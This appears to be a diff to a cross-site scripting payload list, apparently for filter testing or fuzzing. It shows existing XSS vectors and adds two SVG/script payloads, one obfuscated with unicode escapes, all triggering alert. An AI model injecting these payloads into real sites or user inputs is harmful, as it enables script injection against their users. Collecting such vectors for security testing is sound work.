@@ -1194,3 +1194,5 @@ javascript:/*--></title></style></textarea></script></xmp><svg/onload='+//+/onmo
 <video src onloadstart=alert(1)>
 '/onmouseover='alert(1);'/a=
 <applet/object onerror=alert(1)>
+<svg><script xss>\u0061l\u0065rt`X`</script>
+<svg><script>alert(1)<br>
